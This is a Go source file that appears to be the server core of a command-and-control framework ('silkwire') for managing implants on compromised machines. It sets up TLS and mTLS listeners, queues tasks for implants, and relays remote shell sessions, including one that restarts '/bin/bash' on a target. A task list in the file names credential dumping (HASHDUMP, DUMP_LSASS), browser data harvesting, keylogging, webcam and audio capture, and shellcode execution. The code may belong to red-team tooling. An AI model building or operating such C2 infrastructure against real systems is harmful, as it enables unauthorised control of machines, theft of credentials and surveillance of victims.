package main

import (
	"encoding/base64"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"

	pb "silkwire/proto"

	"crypto/tls"

	"github.com/sirupsen/logrus"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/keepalive"
)

type CommandResult struct {
	CommandID string
	Success   bool
	Output    string
	Error     string
	Timestamp time.Time
}

type Session struct {
	ImplantID     string
	SessionToken  string
	Codename      string
	Hostname      string
	Username      string
	OS            string
	Arch          string
	ProcessName   string
	PID           int32
	NetworkIfaces []string
	LastSeen      time.Time
	Created       time.Time
	Transport     string // "streaming", "polling", "unknown"
}

type C2Server struct {
	pb.UnimplementedC2ServiceServer

	// Database connection
	db *Database

	// CA Manager for mTLS (Sliver-style)
	caManager *CAManager

	// Active sessions (in-memory cache)
	sessions    map[string]*Session
	sessionsMux sync.RWMutex

	// Task queues per implant
	taskQueues map[string]chan *pb.Task
	queuesMux  sync.RWMutex

	// Active streams for real-time communication
	streams    map[string]pb.C2Service_BeaconStreamServer
	streamsMux sync.RWMutex

	// Command results storage (in-memory cache)
	commandResults map[string]*CommandResult
	resultsMux     sync.RWMutex

	// PTY session routing: command_id -> console stream and implant id
	ptyMux          sync.RWMutex
	ptyCommandToImp map[string]string
	ptyCommandToCon map[string]pb.C2Service_PTYStreamServer
	
	// PTY session persistence for stream reconnection recovery
	ptySessionsActive map[string]string // implant_id -> command_id for active PTY sessions

	// Listener management
	listeners    map[string]*Listener
	listenersMux sync.RWMutex

	// Implant generation
	generator *ImplantGenerator

	// Session event streaming for console notifications
	eventStreams    map[string]pb.C2Service_SessionEventStreamServer
	eventStreamsMux sync.RWMutex
}

type Listener struct {
	ID        string
	Address   string
	StartedAt time.Time
	ln        net.Listener
	srv       *grpc.Server
	Type      pb.ListenerType
}

func NewC2Server(db *Database, caManager *CAManager) *C2Server {
	generator := NewImplantGenerator()
	generator.SetCAManager(caManager)

	s := &C2Server{
		db:              db,
		caManager:       caManager,
		sessions:        make(map[string]*Session),
		taskQueues:      make(map[string]chan *pb.Task),
		streams:         make(map[string]pb.C2Service_BeaconStreamServer),
		commandResults:  make(map[string]*CommandResult),
		ptyCommandToImp: make(map[string]string),
		ptyCommandToCon: make(map[string]pb.C2Service_PTYStreamServer),
		ptySessionsActive: make(map[string]string),
		listeners:       make(map[string]*Listener),
		generator:       generator,
		eventStreams:    make(map[string]pb.C2Service_SessionEventStreamServer),
	}

	// Load existing sessions from database on startup
	s.loadSessionsFromDB()

	// Load and restart active listeners from database
	s.loadListenersFromDB()

	return s
}

// restartListener restarts a listener with a specific ID using existing logic
func (s *C2Server) restartListener(existingID string, req *pb.ListenerAddRequest) error {
	addr := req.Address
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}

	// Defaults for cert paths
	certPath := req.CertFile
	keyPath := req.KeyFile
	if certPath == "" {
		certPath = "server.crt"
	}
	if keyPath == "" {
		keyPath = "server.key"
	}

	// Configure keepalive enforcement for server
	kaep := keepalive.EnforcementPolicy{
		MinTime:             5 * time.Second, // Allow pings every 5 seconds minimum
		PermitWithoutStream: true,            // Allow pings even when no active RPCs
	}

	kasp := keepalive.ServerParameters{
		Time:    10 * time.Second, // Ping client if no activity for 10 seconds
		Timeout: 5 * time.Second,  // Wait 5 seconds for ping ack before closing connection
	}

	var serverOptions []grpc.ServerOption
	serverOptions = append(serverOptions, grpc.KeepaliveEnforcementPolicy(kaep), grpc.KeepaliveParams(kasp))
	var g *grpc.Server

	switch req.Type {
	case pb.ListenerType_LISTENER_HTTP:
		// No TLS
		serverOptions = append(serverOptions, grpc.MaxRecvMsgSize(64<<20), grpc.MaxSendMsgSize(64<<20))
		g = grpc.NewServer(serverOptions...)
	case pb.ListenerType_LISTENER_MTLS, pb.ListenerType_LISTENER_HTTPS:
		// TLS or mTLS
		var cert tls.Certificate

		if req.Type == pb.ListenerType_LISTENER_MTLS {
			// For mTLS, load or generate persistent CA-signed server certificate
			cert, err = s.caManager.LoadOrGenerateServerCertificate(existingID, addr)
			if err != nil {
				_ = ln.Close()
				return fmt.Errorf("Failed to load/generate mTLS server certificate: %v", err)
			}
			logrus.Infof("Loaded persistent CA-signed server certificate for mTLS listener %s", addr)
		} else {
			// For HTTPS, try to load existing certs first, then fallback to persistent CA-signed
			cert, err = tls.LoadX509KeyPair(certPath, keyPath)
			if err != nil {
				// Load or generate persistent CA-signed certificate
				cert, err = s.caManager.LoadOrGenerateServerCertificate("https-"+existingID, addr)
				if err != nil {
					_ = ln.Close()
					return fmt.Errorf("Failed to load/generate HTTPS server certificate: %v", err)
				}
				logrus.Infof("Loaded persistent CA-signed server certificate for HTTPS listener %s", addr)
			}
		}

		var tlsCfg *tls.Config
		if req.Type == pb.ListenerType_LISTENER_MTLS {
			// Use CA manager for Sliver-style mTLS with automatic certificate management
			tlsCfg = s.caManager.GetTLSConfig(cert)
		} else {
			// Regular HTTPS without client certificates
			// Use same TLS settings as mTLS for consistency (required for stable gRPC streams)
			tlsCfg = &tls.Config{
				Certificates: []tls.Certificate{cert},
				ClientAuth:   tls.NoClientCert,
				MinVersion:   tls.VersionTLS12,
				MaxVersion:   tls.VersionTLS12,
				CipherSuites: []uint16{
					tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				},
			}
		}
		creds := credentials.NewTLS(tlsCfg)
		serverOptions = append(serverOptions, grpc.Creds(creds))
		// Increase gRPC message size limits for generated implant transfers
		serverOptions = append(serverOptions, grpc.MaxRecvMsgSize(64<<20), grpc.MaxSendMsgSize(64<<20))
		g = grpc.NewServer(serverOptions...)
	default:
		// Default to HTTPS with persistent certificates
		cert, err := tls.LoadX509KeyPair(certPath, keyPath)
		if err != nil {
			// Load or generate persistent CA-signed certificate
			cert, err = s.caManager.LoadOrGenerateServerCertificate("default-"+existingID, addr)
			if err != nil {
				_ = ln.Close()
				return fmt.Errorf("Failed to load/generate default server certificate: %v", err)
			}
			logrus.Infof("Loaded persistent CA-signed server certificate for default listener %s", addr)
		}
		// Use same TLS settings as mTLS for consistency (required for stable gRPC streams)
		creds := credentials.NewTLS(&tls.Config{
			Certificates: []tls.Certificate{cert},
			ClientAuth:   tls.NoClientCert,
			MinVersion:   tls.VersionTLS12,
			MaxVersion:   tls.VersionTLS12,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			},
		})
		serverOptions = append(serverOptions, grpc.Creds(creds), grpc.MaxRecvMsgSize(64<<20), grpc.MaxSendMsgSize(64<<20))
		g = grpc.NewServer(serverOptions...)
	}

	// Create a dedicated gRPC server bound to same service state
	pb.RegisterC2ServiceServer(g, s)

	l := &Listener{ID: existingID, Address: addr, StartedAt: time.Now(), ln: ln, srv: g, Type: req.Type}

	s.listenersMux.Lock()
	s.listeners[existingID] = l
	s.listenersMux.Unlock()

	go func() {
		if err := g.Serve(ln); err != nil {
			logrus.Errorf("Listener %s serve error: %v", existingID, err)
			// Note: Listener status no longer tracked in database
		}
	}()

	return nil
}

// Admin function to queue tasks
func (s *C2Server) QueueTask(implantID string, task *pb.Task) error {
	s.queuesMux.RLock()
	taskQueue, exists := s.taskQueues[implantID]
	s.queuesMux.RUnlock()

	if !exists {
		return fmt.Errorf("implant not found: %s", implantID)
	}

	// Save task to database
	if err := s.db.SaveTask(
		task.TaskId,
		implantID,
		task.Type.String(),
		task.Command,
		task.Args,
		task.Data,
		task.Timeout,
	); err != nil {
		logrus.Errorf("Error saving task to database: %v", err)
	}

	select {
	case taskQueue <- task:
		logrus.Infof("Task queued for %s: %s (ID: %s, Type: %s)", implantID, task.Command, task.TaskId, task.Type.String())
		// Update task status to sent
		s.db.UpdateTaskStatus(task.TaskId, "sent")
		return nil
	default:
		return fmt.Errorf("task queue full for implant: %s", implantID)
	}
}

// SendCommandMessage sends a command via stream if available (renamed from SendCommand to avoid conflict)
func (s *C2Server) SendCommandMessage(implantID string, cmd *pb.CommandMessage) error {
	s.streamsMux.RLock()
	stream, exists := s.streams[implantID]
	s.streamsMux.RUnlock()

	if !exists {
		logrus.Warnf("Attempting to send command to implant %s but no active stream found", implantID)
		return fmt.Errorf("no active stream for implant: %s", implantID)
	}

	if stream == nil {
		logrus.Warnf("Stream for implant %s exists but is nil", implantID)
		return fmt.Errorf("invalid stream for implant: %s", implantID)
	}

	if err := stream.Send(cmd); err != nil {
		logrus.Errorf("Failed to send command to implant %s: %v", implantID, err)
		return err
	}

	return nil
}

// parseAndStoreCommandResult parses beacon result payload and stores the result
func (s *C2Server) parseAndStoreCommandResult(payload string, implantID string) {
	// Format: CMD_ID|SUCCESS|OUTPUT_OR_ERROR
	parts := strings.SplitN(payload, "|", 3)
	if len(parts) != 3 {
		logrus.Warnf("Invalid command result format: %s", payload)
		return
	}

	commandID := parts[0]
	success := parts[1] == "true"
	output := parts[2]

	// Log command result with length info for long outputs
	outputPreview := output
	if len(output) > 100 {
		outputPreview = output[:100] + fmt.Sprintf("... (%d more chars)", len(output)-100)
	}

	if success {
		logrus.Infof("Command result: ID=%s, Success=true, Output: %s", commandID, outputPreview)
	} else {
		logrus.Warnf("Command result: ID=%s, Success=false, Error: %s", commandID, outputPreview)
	}

	s.resultsMux.Lock()

	var result *CommandResult
	if existing, exists := s.commandResults[commandID]; exists {
		existing.Success = success
		if success {
			existing.Output = output
			existing.Error = ""
		} else {
			existing.Output = ""
			existing.Error = output
		}
		existing.Timestamp = time.Now()
		result = existing
	} else {
		// Store result even if we don't have a pending entry (for late arrivals)
		result = &CommandResult{
			CommandID: commandID,
			Success:   success,
			Output:    output,
			Error:     "",
			Timestamp: time.Now(),
		}
		if !success {
			result.Error = output
			result.Output = ""
		}
		s.commandResults[commandID] = result
	}
	s.resultsMux.Unlock()

	// Save result to database
	if err := s.db.SaveCommandResult(result); err != nil {
		logrus.Errorf("Error saving command result to database: %v", err)
	}

	// Update command status in database
	status := "completed"
	if !success {
		status = "failed"
	}
	if err := s.db.UpdateCommandStatus(commandID, status); err != nil {
		logrus.Errorf("Error updating command status in database: %v", err)
	}

	// Broadcast task completion notification for long-running commands
	go s.broadcastTaskCompletion(commandID, implantID, success, output)
}

// PTY routing helpers
func (s *C2Server) routePtyOutput(payload []byte) {
	parts := strings.SplitN(string(payload), "|", 2)
	if len(parts) != 2 {
		return
	}
	commandID := parts[0]
	data, err := base64.StdEncoding.DecodeString(parts[1])
	if err != nil {
		return
	}
	s.ptyMux.RLock()
	stream, ok := s.ptyCommandToCon[commandID]
	s.ptyMux.RUnlock()
	if !ok || stream == nil {
		return
	}
	_ = stream.Send(&pb.PTYServerMessage{Msg: &pb.PTYServerMessage_Output{Output: &pb.PTYOutput{CommandId: commandID, Data: data}}})
}

func (s *C2Server) routePtyExit(payload []byte) {
	parts := strings.SplitN(string(payload), "|", 2)
	if len(parts) != 2 {
		return
	}
	commandID := parts[0]
	// exit code parsing best-effort
	s.ptyMux.RLock()
	stream, ok := s.ptyCommandToCon[commandID]
	s.ptyMux.RUnlock()
	if !ok || stream == nil {
		return
	}
	_ = stream.Send(&pb.PTYServerMessage{Msg: &pb.PTYServerMessage_Closed{Closed: &pb.PTYClosed{CommandId: commandID, ExitCode: 0}}})
	s.cleanupPTYSession(commandID)
}

// cleanupPTYSession removes PTY session mappings
func (s *C2Server) cleanupPTYSession(commandID string) {
	s.ptyMux.Lock()
	defer s.ptyMux.Unlock()
	
	// Get implant ID before cleanup for removing active session tracking
	if implantID, exists := s.ptyCommandToImp[commandID]; exists {
		delete(s.ptySessionsActive, implantID)
	}
	
	delete(s.ptyCommandToCon, commandID)
	delete(s.ptyCommandToImp, commandID)
}

// recoverPTYSessions attempts to recover PTY sessions when an implant reconnects
func (s *C2Server) recoverPTYSessions(implantID string) {
	s.ptyMux.Lock()
	defer s.ptyMux.Unlock()
	
	// Check if this implant had an active PTY session
	if commandID, exists := s.ptySessionsActive[implantID]; exists {
		// Verify the console stream is still valid
		if consoleStream, consoleExists := s.ptyCommandToCon[commandID]; consoleExists && consoleStream != nil {
			// Try to restart PTY session on the implant
			cmd := &pb.CommandMessage{
				CommandId: commandID,
				Type:      pb.CommandMessage_PTY_START,
				Command:   "/bin/bash", // Default shell
			}
			
			// Send PTY_START to implant over the new stream
			if err := s.SendCommandMessage(implantID, cmd); err != nil {
				logrus.Errorf("Failed to recover PTY session %s for implant %s: %v", commandID, implantID, err)
				// Clean up failed recovery
				delete(s.ptySessionsActive, implantID)
				delete(s.ptyCommandToCon, commandID)
				delete(s.ptyCommandToImp, commandID)
			} else {
				logrus.Infof("Successfully recovered PTY session %s for implant %s", commandID, implantID)
			}
		} else {
			// Console stream is gone, clean up
			delete(s.ptySessionsActive, implantID)
		}
	}
}

// broadcastSessionEvent sends a session event to all connected console streams
func (s *C2Server) broadcastSessionEvent(eventType pb.SessionEvent_SessionEventType, session *Session, message string) {
	event := &pb.SessionEvent{
		EventType: eventType,
		Session: &pb.SessionInfo{
			ImplantId:         session.ImplantID,
			Codename:          session.Codename,
			Hostname:          session.Hostname,
			Username:          session.Username,
			Os:                session.OS,
			Arch:              session.Arch,
			ProcessName:       session.ProcessName,
			Pid:               session.PID,
			NetworkInterfaces: session.NetworkIfaces,
			LastSeen:          session.LastSeen.Unix(),
			Created:           session.Created.Unix(),
			Transport:         session.Transport,
		},
		Timestamp: time.Now().Unix(),
		Message:   message,
	}

	s.eventStreamsMux.RLock()
	activeStreams := make([]pb.C2Service_SessionEventStreamServer, 0, len(s.eventStreams))
	for _, stream := range s.eventStreams {
		activeStreams = append(activeStreams, stream)
	}
	s.eventStreamsMux.RUnlock()

	// Send to all active streams (non-blocking)
	for _, stream := range activeStreams {
		go func(stream pb.C2Service_SessionEventStreamServer) {
			if err := stream.Send(event); err != nil {
				logrus.Warnf("Failed to send session event to console: %v", err)
			}
		}(stream)
	}

	sessionID := session.ImplantID
	if len(sessionID) > 8 {
		sessionID = sessionID[:8]
	}
	logrus.Infof("Broadcasted session event: %s for session %s to %d console(s)",
		eventType.String(), sessionID, len(activeStreams))
}

// broadcastTaskCompletion broadcasts task completion notification for long-running commands
func (s *C2Server) broadcastTaskCompletion(commandID, implantID string, success bool, output string) {
	// Get task/command type from database to check if it's a long-running command
	var taskType string

	// First try DBTask table (for queued tasks)
	task, err := s.db.GetTaskByID(commandID)
	if err == nil {
		taskType = task.Type
	} else {
		// Fallback to DBCommand table (for stream-sent commands)
		cmd, err := s.db.GetCommand(commandID)
		if err != nil {
			logrus.Debugf("Task completion: could not find task/command %s in database", commandID)
			return // Can't determine task type, skip notification
		}
		taskType = cmd.Type
	}

	// Only notify for long-running commands
	longRunningCommands := map[string]bool{
		"NETWORK_SCAN":         true,
		"IFCONFIG":             true,
		"HASHDUMP":             true,
		"DUMP_LSASS":           true,
		"HARVEST_CHROME":       true,
		"HARVEST_FIREFOX":      true,
		"HARVEST_EDGE":         true,
		"HARVEST_ALL_BROWSERS": true,
		"CLIPBOARD_MONITOR":    true,
		"KEYLOG_STOP":          true,
		"AUDIO_CAPTURE":        true,
		"WEBCAM_CAPTURE":       true,
		"EXECUTE_ASSEMBLY":     true,
		"EXECUTE_SHELLCODE":    true,
		"EXECUTE_PE":           true,
		"EXECUTE_BOF":          true,
	}

	if !longRunningCommands[taskType] {
		return // Skip notification for quick commands
	}

	logrus.Infof("Broadcasting task completion notification for %s (type: %s)", commandID, taskType)

	// Get session info for notification
	s.sessionsMux.RLock()
	session, exists := s.sessions[implantID]
	s.sessionsMux.RUnlock()

	// Build clean notification message (no raw output)
	var msg string
	if success {
		msg = fmt.Sprintf("%s completed (use 'results %s' to view)", taskType, commandID)
	} else {
		// For failures, show a brief error hint
		errorHint := output
		if len(errorHint) > 50 {
			errorHint = errorHint[:50] + "..."
		}
		msg = fmt.Sprintf("%s failed: %s", taskType, errorHint)
	}

	// If session exists in memory, use it; otherwise create a minimal session for notification
	if !exists {
		session = &Session{
			ImplantID: implantID,
		}
	}

	s.broadcastSessionEvent(pb.SessionEvent_TASK_COMPLETED, session, msg)
}
